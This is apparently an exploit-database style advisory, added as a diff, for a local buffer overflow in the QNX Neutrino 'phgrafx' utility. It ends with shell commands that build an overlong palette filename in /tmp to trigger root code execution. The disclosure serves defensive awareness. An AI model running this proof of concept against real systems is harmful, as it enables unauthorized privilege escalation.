@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/30024/info
+
+QNX Neutrino RTOS is prone to a local buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied input. This issue affects the 'phgrafx' utility.
+
+Attackers can exploit this issue to execute arbitrary code with superuser privileges. Successful exploits will completely compromise affected computers. Failed exploit attempts will result in a denial of service.
+
+QNX Neutrino RTOS 6.3.2 and 6.3.0 are vulnerable; other versions may be affected as well.
+
+# PHOTON_PATH=/tmp
+# cd /tmp
+# mkdir palette
+# cd palette
+# touch `perl -e 'print "A" x 290 . ".pal"'`
+# /usr/photon/bin/phgrafx
